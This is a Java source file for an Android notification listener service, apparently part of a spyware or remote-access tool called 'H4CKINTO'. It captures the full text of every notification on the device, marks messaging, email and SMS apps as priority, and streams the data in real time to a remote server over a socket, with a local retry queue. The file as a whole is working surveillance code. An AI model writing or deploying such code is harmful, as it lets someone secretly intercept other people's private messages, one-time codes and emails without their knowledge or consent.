package com.h4ckinto.android.service;

import android.app.Notification;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class H4CKINTONotificationListenerService extends NotificationListenerService {
    private static final String TAG = "H4CKINTONotificationListener";
    private SocketManager socketManager;
    private PackageManager packageManager;
    
    // Important apps to prioritize
    private static final String[] IMPORTANT_APPS = {
        "com.whatsapp", "com.facebook.orca", "com.instagram.android", 
        "com.google.android.gm", "com.android.mms", "com.android.phone",
        "com.skype.raider", "com.telegram.messenger", "com.twitter.android",
        "com.snapchat.android", "com.discord", "com.viber.voip",
        "com.slack", "com.microsoft.teams", "com.spotify.music",
        "com.netflix.mediaclient", "com.youtube", "com.tiktok",
        "com.android.chrome", "com.facebook", "com.linkedin"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🚨 Real-time Notification Listener Service created");
        socketManager = SocketManager.getInstance(this);
        packageManager = getPackageManager();
        Log.d(TAG, "SocketManager initialized: " + (socketManager != null));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        
        try {
            // Process notification in background thread for better performance
            new Thread(() -> processNotification(sbn)).start();
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }

    private void processNotification(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String appName = getAppName(packageName);
            
            // Skip system notifications and our own app
            if (packageName.startsWith("android") || 
                packageName.startsWith("com.android.systemui") ||
                packageName.equals(getPackageName())) {
                return;
            }
            
            // Extract notification data
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            
            String title = extractTitle(extras);
            String text = extractText(extras);
            String subText = extractSubText(extras);
            String bigText = extractBigText(extras);
            String summaryText = extractSummaryText(extras);
            
            // Combine all text content
            StringBuilder fullContent = new StringBuilder();
            if (title != null && !title.isEmpty()) {
                fullContent.append("Title: ").append(title).append("\n");
            }
            if (text != null && !text.isEmpty()) {
                fullContent.append("Text: ").append(text).append("\n");
            }
            if (subText != null && !subText.isEmpty()) {
                fullContent.append("Sub: ").append(subText).append("\n");
            }
            if (bigText != null && !bigText.isEmpty()) {
                fullContent.append("Big: ").append(bigText).append("\n");
            }
            if (summaryText != null && !summaryText.isEmpty()) {
                fullContent.append("Summary: ").append(summaryText).append("\n");
            }
            
            // Create notification data
            JSONObject notificationData = new JSONObject();
            notificationData.put("key", sbn.getKey());
            notificationData.put("packageName", packageName);
            notificationData.put("appName", appName);
            notificationData.put("title", title != null ? title : "No title");
            notificationData.put("text", text != null ? text : "No text");
            notificationData.put("content", fullContent.toString().trim());
            notificationData.put("postTime", sbn.getPostTime());
            notificationData.put("timestamp", sbn.getPostTime());
            notificationData.put("isImportant", isImportantApp(packageName));
            notificationData.put("category", getAppCategory(packageName));
            notificationData.put("hasIcon", notification.getSmallIcon() != null);
            notificationData.put("isOngoing", (notification.flags & Notification.FLAG_ONGOING_EVENT) != 0);
            notificationData.put("isPersistent", (notification.flags & Notification.FLAG_NO_CLEAR) != 0);
            notificationData.put("priority", getPriorityString(notification.priority));
            notificationData.put("channelId", notification.getChannelId());
            
            // Format timestamp
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            notificationData.put("postTimeFormatted", sdf.format(new Date(sbn.getPostTime())));
            
            // Send real-time notification to server
            sendRealtimeNotification(notificationData);
            
            Log.d(TAG, "📱 Real-time notification processed: " + appName + " - " + title);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification details", e);
        }
    }

    private void sendRealtimeNotification(JSONObject notificationData) {
        try {
            // Ensure socket manager is available
            if (socketManager == null) {
                socketManager = SocketManager.getInstance(this);
                Log.d(TAG, "SocketManager was null, reinitialized: " + (socketManager != null));
            }
            
            // Always try to send notification immediately
            if (socketManager != null) {
                // Force connection if not connected
                if (!socketManager.isConnected()) {
                    Log.d(TAG, "Socket not connected, attempting to connect...");
                    socketManager.connect();
                    
                    // Wait a moment for connection
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }
                
                // Send notification regardless of connection status
                socketManager.sendNotificationData(notificationData);
                Log.d(TAG, "✅ Real-time notification sent to server: " + 
                    notificationData.optString("appName", "Unknown"));
                
                // Also queue for retry in case it failed
                queueNotificationForRetry(notificationData);
            } else {
                Log.w(TAG, "❌ SocketManager is null, queuing notification for retry");
                queueNotificationForRetry(notificationData);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending real-time notification", e);
            // Queue for retry on error
            queueNotificationForRetry(notificationData);
        }
    }

    private void queueNotificationForRetry(JSONObject notificationData) {
        // Store notification in SharedPreferences for retry
        try {
            android.content.SharedPreferences prefs = getSharedPreferences("notification_queue", MODE_PRIVATE);
            android.content.SharedPreferences.Editor editor = prefs.edit();
            
            String key = "notification_" + System.currentTimeMillis();
            editor.putString(key, notificationData.toString());
            editor.apply();
            
            Log.d(TAG, "Notification queued for retry: " + key);
        } catch (Exception e) {
            Log.e(TAG, "Error queuing notification", e);
        }
    }

    private String getAppName(String packageName) {
        try {
            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
            return packageManager.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private boolean isImportantApp(String packageName) {
        for (String app : IMPORTANT_APPS) {
            if (packageName.startsWith(app)) {
                return true;
            }
        }
        return false;
    }

    private String getAppCategory(String packageName) {
        if (packageName.startsWith("com.whatsapp") || packageName.startsWith("com.telegram") || 
            packageName.startsWith("com.facebook.orca") || packageName.startsWith("com.skype")) {
            return "Messaging";
        } else if (packageName.startsWith("com.instagram") || packageName.startsWith("com.snapchat") || 
                   packageName.startsWith("com.twitter") || packageName.startsWith("com.facebook")) {
            return "Social Media";
        } else if (packageName.startsWith("com.google.android.gm") || packageName.startsWith("com.microsoft") ||
                   packageName.startsWith("com.outlook")) {
            return "Email";
        } else if (packageName.startsWith("com.android.phone") || packageName.startsWith("com.android.mms")) {
            return "Phone/SMS";
        } else if (packageName.startsWith("com.spotify") || packageName.startsWith("com.youtube") ||
                   packageName.startsWith("com.netflix")) {
            return "Media";
        } else if (packageName.startsWith("com.google") || packageName.startsWith("com.android")) {
            return "System";
        } else {
            return "Other";
        }
    }

    private String extractTitle(Bundle extras) {
        if (extras == null) return null;
        return extras.getString(Notification.EXTRA_TITLE);
    }

    private String extractText(Bundle extras) {
        if (extras == null) return null;
        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
        return text != null ? text.toString() : null;
    }

    private String extractSubText(Bundle extras) {
        if (extras == null) return null;
        CharSequence subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
        return subText != null ? subText.toString() : null;
    }

    private String extractBigText(Bundle extras) {
        if (extras == null) return null;
        CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
        return bigText != null ? bigText.toString() : null;
    }

    private String extractSummaryText(Bundle extras) {
        if (extras == null) return null;
        CharSequence summaryText = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT);
        return summaryText != null ? summaryText.toString() : null;
    }

    private String getPriorityString(int priority) {
        switch (priority) {
            case Notification.PRIORITY_MIN:
                return "MIN";
            case Notification.PRIORITY_LOW:
                return "LOW";
            case Notification.PRIORITY_DEFAULT:
                return "DEFAULT";
            case Notification.PRIORITY_HIGH:
                return "HIGH";
            case Notification.PRIORITY_MAX:
                return "MAX";
            default:
                return "UNKNOWN";
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        Log.d(TAG, "📱 Notification removed: " + sbn.getPackageName());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🚨 Real-time Notification Listener Service destroyed");
    }
}

